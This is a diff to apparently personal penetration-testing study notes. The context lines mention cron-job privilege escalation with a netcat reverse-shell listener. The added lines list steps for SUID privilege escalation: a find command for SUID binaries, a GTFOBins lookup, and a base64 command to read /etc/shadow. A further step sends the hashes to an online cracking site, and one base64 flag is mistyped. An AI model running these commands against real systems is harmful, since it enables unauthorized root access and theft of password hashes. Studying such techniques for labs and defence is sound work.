@@ -217,3 +217,14 @@ privilege escalation with contabs
   https://www.revshells.com/
   execute on server
   on client: nc -lvnp 4465
+
+privilege escalation with suid // files that runs with the permissions of the users
+  1-find suid on files using find / -type f -perm -04000 -ls 2>/dev/null
+  2-search for the exploit on  https://gtfobins.github.io/
+  3-run the exploit on the target system
+
+    /usr/bin/base64
+    LFILE=/etc/shadow
+    base64 "$LFILE" | base64 --docode
+    now dehash
+      hashes.com/en/decrypt/hash
